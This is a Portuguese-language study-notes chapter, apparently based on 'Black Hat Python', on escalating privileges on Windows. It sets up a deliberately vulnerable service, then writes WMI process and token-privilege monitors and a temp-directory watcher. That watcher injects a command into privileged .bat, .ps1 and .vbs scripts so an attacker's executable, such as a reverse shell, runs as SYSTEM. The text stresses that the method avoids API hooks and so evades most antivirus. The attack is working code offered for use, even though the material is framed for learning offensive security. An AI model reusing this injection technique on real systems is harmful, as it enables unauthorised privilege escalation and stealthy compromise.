# Capitulo 10 

Nesse capítulo serão abordadas algumas formas de escalonamento de privilégios numa máquina Windows.

## Escalonamento de privilégios no Windows

Inspirando-se na situação de que você adiquiriu acesso a uma máquina Windows e você deseja se aproveitar das funcionalidades do OS para ter mais privilégios. Nossa abordagem, de acordo com os autores, envolveria explorar drivers mal-programados ou problemas no kernel do Windows, mas sem prejudicar a estabilidade do sistema. Exploraremos maneiras diferentes de escalar privilégios no Windows.

É falado que administradores de sistemas agendam tarefas ou serviços frequentemente, usando processos secundários ou [VBScript](https://pt.wikipedia.org/wiki/VBScript)/Powershell. A ideia é se aproveitar desses processos de privilégio alto para usar nossos próprios códigos binários para executar funções.

Iremos começar aprendenrdo a usar a programação da Instrumentação de Gerenciamento do Windows (Windows Management Instrumentation, WMI) para criar uma interface de monitoramento da criação de novos processos. Buscaremos caminhos de arquivo, o usuário que criou os processos e os privilégios usados. 

Feito isso, usaremos um script de monitoramento de arquivos para verificar quando um novo arquivo é criado, bem como o conteúdo dele. Agora, finalmente, interceptaremos o processo de criação de arquivos para injetar nosso script nele e, em seguida, faremos um processo de alto privilégio executá-lo.

Note que não usamos em nenhum momento hooks de API, tornando nosso método vantajoso pois ele pode passar despercebido pela maioria dos antivírus.

### Instalando os pré-requisitos

Instale as libs `pywin32`, `wmi` e `pyinstaller` através de:

```bash
pip install pywin32 wmi pyinstaller
```

### Criando o serviço vulnerável BlackHat

Os autores afirmam que simularemos vulnerabilidades presentes em redes corporativas de grande porte. Vamos começar fazendo um código que copia um script para um diretório temporário e executa-o. Em `service.py`:

```py
# Aqui fazemos os imports básicos

import os   # Biblioteca padrão para interagir com o sistema operacional e manipular variáveis de ambiente, caminhos de arquivos, etc.
import servicemanager # Biblioteca que fornece ferramentas para criar, gerenciar e interagir com serviços do Windows, útil para registros de eventos.
import shutil   # Biblioteca padrão que permite copiar, mover, renomear e manipular arquivos e diretórios.
import subprocess   # Biblioteca padrão usada para executar e gerenciar subprocessos, como executar comandos do sistema.
import sys  # Biblioteca padrão para acessar funcionalidades relacionadas ao sistema, como argumentos da linha de comando e encerramento do programa.
import win32event   # Parte do pacote pywin32, usada para criar e manipular eventos no sistema operacional Windows.
import win32service # Parte do pacote pywin32, usada para criar, configurar e gerenciar serviços do Windows.
import win32serviceutil # Parte do pacote pywin32, fornece utilitários para facilitar o gerenciamento de serviços do Windows, como instalação e remoção.


# Os diretórios onde tem o arquivo original e para onde vai o arquivo temporário
SRCDIR = 'C:\\Users\\caioe\\Documents\\Projetos\\BHPython\\c10\\dir'
TGTDIR = 'C:\\Users\\caioe\\Documents\\Projetos\\BHPython\\c10\\temp'
```

Em seguida, criaremos a classe que representará o nosso serviço:

```py
# Define uma classe que herda de win32serviceutil.ServiceFramework para criar um serviço no Windows
class ServerSvc(win32serviceutil.ServiceFramework):
    # Nome interno do serviço no sistema
    _svc_name = "BlackHatService"
    # Nome exibido para os usuários no Gerenciador de Serviços
    _svc_display_name_ = "Black Hat Service"
    # Descrição do serviço que será exibida nas propriedades do serviço
    _svc_description_ = (
        "Executa o VBScript em intervalos regulares" +
        " O que poderia dar errado?"
    )
    
    # Método inicializador da classe (construtor)
    def __init__(self, args):
        # Define o caminho para o arquivo VBScript a ser executado
        self.vbs = os.path.join(TGTDIR, 'bhservice_task.vbs')
        # Define o tempo de espera em milissegundos (1 minuto)
        self.timeout = 1000 * 60
        
        # Chama o inicializador da classe base para configurar o serviço
        win32serviceutil.ServiceFramework.__init__(self, args)
        # Cria um evento que será usado para sinalizar quando o serviço deve parar
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
    
    # Método chamado quando o serviço é solicitado para parar
    def SvcStop(self):
        # Reporta que o serviço está em processo de parada
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        # Sinaliza o evento para indicar que o serviço deve encerrar
        win32event.SetEvent(self.hWaitStop)
    
    # Método chamado quando o serviço é solicitado para iniciar
    def SvcDoRun(self):
        # Reporta que o serviço está em execução
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
        # Chama o método principal que contém a lógica do serviço
        self.main()
```

A função `self.main()` por sua vez, executará a lógica do serviço, implementaremos ela da seguinte maneira:

```py
# Método principal do serviço, responsável pela lógica de execução contínua
def main(self):
    # Loop principal do serviço
    while True:
        # Aguarda que o evento de parada seja sinalizado ou que o tempo de timeout expire
        ret_code = win32event.WaitForSingleObject(
            self.hWaitStop, self.timeout
        )
        # Verifica se o evento foi abandonado (indica que o serviço deve encerrar)
        if ret_code == win32event.WAIT_ABANDONED_0:
            # Loga uma mensagem informando que o serviço está sendo encerrado
            servicemanager.LogInfoMsg("O serviço está sendo encerrado")
            # Sai do loop principal, encerrando a execução
            break
        
        # Define o caminho do script-fonte (VBScript) que será copiado
        src = os.path.join(SRCDIR, 'bhservice_task.vbs')
        # Copia o script-fonte para o local especificado no serviço
        shutil.copy(src, self.vbs)
        # Executa o script VBScript usando o interpretador `cscript.exe`
        subprocess.call("cscript.exe %s" % self.vbs, shell=False)
        # Remove o script copiado após a execução
        os.unlink(self.vbs)

# Código principal que será executado quando o script for iniciado diretamente
if __name__ == '__main__':
    # Verifica se o script foi chamado sem argumentos (modo serviço)
    if len(sys.argv) == 1:
        # Inicializa o gerenciamento do serviço
        servicemanager.Initialize()
        # Prepara o serviço para rodar como um serviço do Windows
        servicemanager.PrepareToHostSingle(ServerSvc)
        # Inicia o despachante de controle do serviço
        servicemanager.StartServiceCtrlDispatcher()
    
    # Caso contrário, interpreta os argumentos da linha de comando para manipular o serviço
    else:
        win32serviceutil.HandleCommandLine(ServerSvc)
```

Para usálo, primeiro criaremos um executável standalone para que possamos usar esse código:

```bash
pyinstaller -F --hiddenimport win32timezone service.py
```

- `-F` ou `--onefile` significa que criaremos um único arquivo para a execução
- `--hiddenimport win32timezone` garante que o PyInstaller inclua o módulo win32timezone, que pode ser usado implicitamente por bibliotecas como pywin32. Sem isso, o executável pode falhar ao ser executado

Com o executável em mãos, faremos com que ele seja instalado no Windows no **CMD de adiministrador** através de:

```bash
service.exe install
```

Agora ele está instalado como serviço. Você pode visualizá-lo no aplicativo do Gerenciador de Serviços do Windows:

![services](../imagens/service_run.png)

Mas ele não estaria iniciado ainda. Para iniciá-lo:

```bash
service.exe start
```

Agora, a cada timeout (1000*60 ms = 1min) o serviço copiará o arquivo do `SRCDIR` e o enviará para o `TGTDIR` para executá-lo em seguida. Depois ele o excluirá. Ele continuará nesse loop até você usar

```bash
service.exe stop
```

E, assim que ele terminar o processo de stop, você pode excluí-lo com:


```bash
service.exe remove
```

Você também é capaz de fazer isso através do menu do Gerenciador de Serviços.

Caso ele esteja demorando para finalizar, você pode executar:

```bash
sc queryex <TITULO DO PROCESSO>
taskkill /PID <PID_DO_PROCESSO> /F
service.exe remove
```

**OBSERVAÇÃO**: Existem scripts que travam a execução do serviço, por traterem de funções indisponíveis para esse tipo de processo (Ex: scripts que tenham Message Box, que envolve interface gráfica > **A mensagem não será exibida na GUI, porque serviços executam em uma sessão isolada (Session 0) e não têm acesso direto à interface do usuário**). Você pode debugar o seu script usando o que eu usei:

```vbs
' Substituindo MsgBox por um log
Dim objFSO, objFile
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\Users\caioe\Documents\Projetos\BHPython\c10\temp\log.txt", 8, True)

objFile.WriteLine "AHAHAHAHAHAHAHAAH - Executado em " & Now
objFile.Close
```

### Criando um monitor de processos

Os autores, nessa parte do livro, falam brevemente sobre um monitor de processos, que usava DLLs, que um deles criou durante um pedido feito por uma empresa de segurança. Ele, depois de criá-lo, pensou em usá-lo de maneira ofensiva usando hooks para chamados de funções `CreateProcess` no Windows. 

Contudo eles afirmaram que a maioria dos antivírus interceptam hooks para essas funções, tornando arriscado o uso dessa feature para a realização do nosso monitor de processos.

Inspirados nisso, porém, usaremos algumas técnicas (sem hooks) para criar nosso próprio monitor de processos com a WMI.

### Monitoramento de processos com a WMI

A WMI fornece a capacidade de monitorar um sistema para eventos específicos e receber retornos quando eles ocorrem, algo similar ao feito anteriormente para os serviços. Usaremos ela para armazenar o horário que processos foram criados, o usuário responsável e o executável usado, bem como os argumentos da linha de comando, o ID do processo (PID) e o ID do processo-pai. 

Isso nos permitirá identificar processos que chamem arquivos externos, VBScripts, batchs, etc. Usaremos a execução dos códigos a seguir como monitorador. Em `process_monitor.py`:

```py
# Importa módulos necessários para o funcionamento do código.
import os               # Para operações de sistema relacionadas ao SO.
import sys              # Para manipulação de argumentos e interação com o interpretador.
import win32api         # Para interação com a API do Windows.
import win32con         # Fornece constantes usadas em operações com a API do Windows.
import win32security    # Para gerenciar e verificar permissões e privilégios.
import wmi              # Biblioteca para interagir com o WMI (Windows Management Instrumentation).

# Função para gravar mensagens em um arquivo de log.
def log_to_file(message):
    # 'a' indica que o arquivo será aberto em modo de adição, não sobrescrevendo o conteúdo existente.
    with open('process_monitor_log.csv', 'a') as fd:
        fd.write(f'{message}\r\n')  # Escreve a mensagem e adiciona uma nova linha no final.

# Função principal que monitora a criação de processos.
def monitor():
    # Cabeçalho do arquivo de log, representando as informações que serão coletadas sobre os processos.
    head = 'CommandLine, Time, Executable, Parent PID, PID, User, Privileges'
    log_to_file(head)  # Registra o cabeçalho no arquivo de log.

    # Cria um objeto para interagir com o WMI.
    c = wmi.WMI()

    # Configura um "watcher" para monitorar a criação de novos processos.
    process_watcher = c.Win32_Process.watch_for('creation')

    # Loop infinito para monitorar continuamente.
    while True:
        try:
            # Aguarda e captura informações sobre o próximo processo criado.
            new_process = process_watcher()

            # Coleta informações do processo criado.
            cmd_line = new_process.CommandLine          # Linha de comando usada para iniciar o processo.
            create_date = new_process.CreationDate      # Data de criação do processo.
            executable = new_process.ExecutablePath     # Caminho completo do executável.
            parent_pid = new_process.ParentProcessId    # ID do processo pai.
            pid = new_process.ProcessId                # ID do processo atual.
            proc_owner = new_process.GetOwner()        # Propriedade que retorna o usuário que iniciou o processo.

            # Privilegios são definidos como 'N/A', mas poderiam ser implementados.
            privileges = 'N/A'

            # Formata as informações do processo em uma mensagem de log.
            process_log_message = (
                f'{cmd_line}, {create_date}, {executable}, {parent_pid}, \
                {pid}, {proc_owner}, {privileges}'
            )

            # Exibe as informações no console.
            print(process_log_message)
            print()

            # Escreve as informações no arquivo de log.
            log_to_file(process_log_message)

        # Captura exceções e ignora erros durante o monitoramento.
        except Exception:
            pass

# Ponto de entrada do script.
if __name__ == '__main__':
    # Inicia a função de monitoramento.
    monitor()
```

### Explorando o código

Ao explorar o código, em um terminal de Administrador, tudo correu bem.

### Privilégios de token do Windows

Vamos preencher o capo de privilégios (`privileges`), mas, antes disso, vamos entender um pouco como funcionam os privilégios do Windows.

De acordo com a Microsoft, um [token de acesso windows](https://learn.microsoft.com/pt-br/windows/win32/secauthz/access-tokens) é um "objeto que descreve o contexto de segurança de um processo ou thread". Os tokens de maior liberdade são os que mexem diretamente com o Windows em si (drivers). Os desenvolvedores utilizam, em alguns casos, métodos que levam ao escalonamento de privilégios Windows. Um exemplo citado é a chamada da função da API do Windows `AdjustTokenPrivileges`, que possui o privilégio `SeLoadDriver`. Nesse caso, se conseguirmos acessar essa aplicação, teremos acesso para instalar qualquer driver desejado, nos dando praticamente privilégios de Kernel ser usarmos um rootkit, por exemplo.

Caso não se consiga executar o monitor de processos como SYSTEM ou como Administrador, é preciso se atentar aos processos que você consegue monitorar. Existem alguns privilégios importantes, os autores listam três, mas você pode achar todos neste [link](https://learn.microsoft.com/pt-br/windows/win32/secauthz/privilege-constants):

| Nome do Privilégio     | Acesso Concedido                                                                                  |
|------------------------|--------------------------------------------------------------------------------------------------|
| SeBackupPrivilege      | Permite que o processo do usuário faça backup de arquivos e diretórios, concedendo acesso de leitura independentemente do que a lista de controle de acesso (ACL) define. |
| SeDebugPrivilege       | Permite que o processo do usuário depure outros processos, incluindo a obtenção de handles de processos para injetar DLLs ou código em processos em execução.             |
| SeLoadDriver           | Permite que um processo de usuário carregue ou descarregue drivers.                                                                   |


Sabemos então quais processos procurar. Usaremos o Python para achar os privilégios habilitados nos processos que estamos procurando. Vamos criar a função `get_process_privileges`:

```py
def get_process_privileges(pid):
    try:
        # Abre o processo com a permissão de consulta de informações.
        hproc = win32api.OpenProcess(
            win32con.PROCESS_QUERY_INFORMATION,  # Permissão para consultar informações do processo.
            False,                              # Não herda identificadores.
            pid                                 # ID do processo alvo.
        )
        
        # Obtém o token de acesso associado ao processo.
        htok = win32security.OpenProcessToken(
            hproc, 
            win32con.TOKEN_QUERY               # Permissão para consultar o token.
        )
        
        # Obtém informações de privilégios do token.
        privs = win32security.GetTokenInformation(
            htok, 
            win32security.TokenPrivileges      # Tipo de informação: privilégios.
        )
        
        # Inicializa a string que armazenará os privilégios habilitados.
        privileges = ''
        
        # Itera sobre os privilégios retornados.
        for priv_id, flags in privs:
            # Verifica se o privilégio está habilitado ou habilitado por padrão.
            if flags == (win32security.SE_PRIVILEGE_ENABLED |
                         win32security.SE_PRIVILEGE_ENABLED_BY_DEFAULT):
                # Converte o ID do privilégio para seu nome legível e o adiciona à lista.
                privileges += f'{win32security.LookupPrivilegeName(None, priv_id)}|'
                
    except Exception:
        # Em caso de erro, define os privilégios como 'N/A'.
        privileges = 'N/A'
    
    # Retorna a lista de privilégios como uma string (separada por "|").
    return privileges


.......................
def monitor():

    ........

        privileges = get_process_privileges(pid)
```

Pronto! Agora temos um método de buscar os privilégios por nome em cada processo criado. Nos falta então criar uma lógica para usá-los.

### Vencendo a corrida

Os autores afirmam que, via de regra, existem scripts que são acionados rotineiramente pelo sistema para executar tarefas. Contudo, assim como o exemplo do início co capítulo, esses scripts são salvos em um arquivo temporário, executados e em seguida deletados. Queremos vencer essa corrida de execução de arquivos para colocarmos nossos próprios scripts e, para isso, usaremos a API do Windows `ReadDirectoryChangesW`, para monitorar a escrita de novos arquivos em determinado diretório. Em `file_monitor.py`:

```py
import os             # Para operações com arquivos e caminhos.
import tempfile       # Para manipular diretórios temporários.
import threading      # Para criar e gerenciar threads.
import win32con       # Para usar constantes da API do Windows.
import win32file      # Para manipulação de arquivos e diretórios no Windows.

# Constantes que representam ações em arquivos/diretórios.
FILE_CREATED = 1         # Arquivo criado.
FILE_DELETED = 2         # Arquivo excluído.
FILE_MODIFIED = 3        # Arquivo modificado.
FILE_RENAMED_FROM = 4    # Arquivo renomeado (antes).
FILE_RENAMED_TO = 5      # Arquivo renomeado (depois).

# Permissão necessária para monitorar o diretório.
FILE_LIST_DIRECTORY = 0x0001

# Lista de diretórios a serem monitorados.
PATHS = ['c:\\WINDOWS\\Temp', tempfile.gettempdir()]  # Diretório TEMP do sistema e TEMP do usuário.

# Função para monitorar alterações em um diretório específico.
def monitor(path_to_watch):
    # Abre o diretório para monitoramento usando a API do Windows.
    h_directory = win32file.CreateFile(
        path_to_watch,  # Caminho do diretório a ser monitorado.
        FILE_LIST_DIRECTORY,  # Permissão para listar diretórios.
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE, 
        None,  # Sem segurança adicional.
        win32con.OPEN_EXISTING,  # Não criar um novo arquivo/diretório, apenas acessar o existente.
        win32con.FILE_FLAG_BACKUP_SEMANTICS,  # Permissão necessária para operar em diretórios.
        None
    )
    
    # Loop infinito para monitorar continuamente o diretório.
    while True:
        try:
            # Obtém mudanças no diretório.
            results = win32file.ReadDirectoryChangesW(
                h_directory,  # Identificador do diretório.
                1024,         # Tamanho do buffer (1 KB).
                True,         # Monitorar alterações em subdiretórios.
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,         # Sobreposição não usada.
                None          # Estrutura de retorno não usada.
            )
            
            # Processa as alterações detectadas.
            for action, file_name in results:
                # Cria o caminho completo do arquivo alterado.
                full_filename = os.path.join(path_to_watch, file_name)
                
                # Identifica a ação realizada e imprime mensagens no console.
                if action == FILE_CREATED:
                    print(f'[+] {full_filename} criado')
                elif action == FILE_DELETED:
                    print(f'[-] {full_filename} excluído')
                elif action == FILE_MODIFIED:
                    print(f'[*] {full_filename} modificado')
                    try:
                        print('[vvv] Extraindo conteúdo...')
                        # Tenta abrir e ler o conteúdo do arquivo modificado.
                        with open(full_filename) as f:
                            contents = f.read()
                        print(contents)  # Exibe o conteúdo do arquivo.
                        print('[^^^] Extração concluída')
                    except Exception as e:
                        print(f'[!!] Falha na extração: {e}')  # Captura erros ao abrir o arquivo.
                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renomeado de {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renomeado para {full_filename}')
                else:
                    print(f'[?] Ação desconhecida para {full_filename}')
        
        # Captura e ignora exceções, permitindo que o monitoramento continue.
        except Exception:
            pass

# Ponto de entrada do script.
if __name__ == '__main__':
    # Inicia uma thread separada para monitorar cada diretório da lista.
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path, ))
        monitor_thread.start()
```

Boa! Agora temos um monitor de diretórios bem estruturado. Você pode testar criando arquivos em diretórios que estão nos PATHs.

### Injeção de código

Vamos agora adaptar nosso código para executar executáveis abritrários quando o arquivo é modificado. Os autores, no livro, exemplificam ao criar um executável do `netcat.py` criado nos primeiros capítulos. Não seguirei esse processo de criar um executável como eles fizeram pois priorizarei o código.

Vamos adaptar nosso `file_monitor.py` para que ele crie um [shell de comando reverso](https://www.checkpoint.com/pt/cyber-hub/cyber-security/what-is-cyber-attack/what-is-a-reverse-shell-attack/):

```py
# Adicionaremos as seguintes constantes ao nosso arquivo python
# Local do executável que usaremos
EXEC_PATH = 'C:\\Users\\caioe\\Documents\\Projetos\\BHPython\\c10\\codigos\\hello_world\\dist\\hello_world.exe' 
# Os argumentos a serem colocados
ARGS = ''
# O comando completo de execução
CMD = f'{EXEC_PATH} {ARGS}'

# Aqui foi criada uma matriz para, dependendo do tipo de arquivo que foi modificado (executáveis), seja adicionada uma nova linha que
# execute o nosso CMD

# Note que há um título para cada execução ("bhmaker")
FILE_TYPES = {
    '.bat': ["\r\nREM bhpmaker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmaker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'bhpmaker\r\n",
             f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n']
}

# Aqui, na função inject_code(), é recebido o nome do arquivo, o seu conteúdo e a sua extensão
def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents: # Se o "titulo" da nossa injeção já está no conteúdo, não fazemos nada
        return
    
    # Caso contrário, excrevemos nossa execução
    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Codigo Injetado!')  # mensagem de retorno de sucesso

..............

def monitor(path_to_watch)

........
        # Modificamos o montior para que, quando o arquivo for modificado (evitando suspeitas), nós verificamos a extensão
            elif action == FILE_MODIFIED:
                    extension = os.path.splitext(full_filename)[1]
                    if extension in FILE_TYPES: # Se a extensão estiver nas que desejamos monitorar, 
                                                # tentamos ler o arquivo e injetar código
                            print(f'[*] {full_filename} modificado')
                            print('[vvv] Extraindo conteudo...')
                            try:
                                with open(full_filename) as f:
                                    contents = f.read()
                                inject_code(full_filename, contents, extension)     # trecho de injeção
                                print(contents)
                                print('[^^^] Extracao concluida')
                            except Exception as e:
                                print(f'[!!] Falha na extracao: {e}')
```

Agora temos uma forma de injetar código em rotinas arbitrariamente!

### Explorando código

Os autores usam o exemplo do nosso `netcat` pois nele temos uma interface de linha de comando remota. É possível deixar o usuário com permissão de SYSTEM devido aos privilégios da execução da nossa rotina!
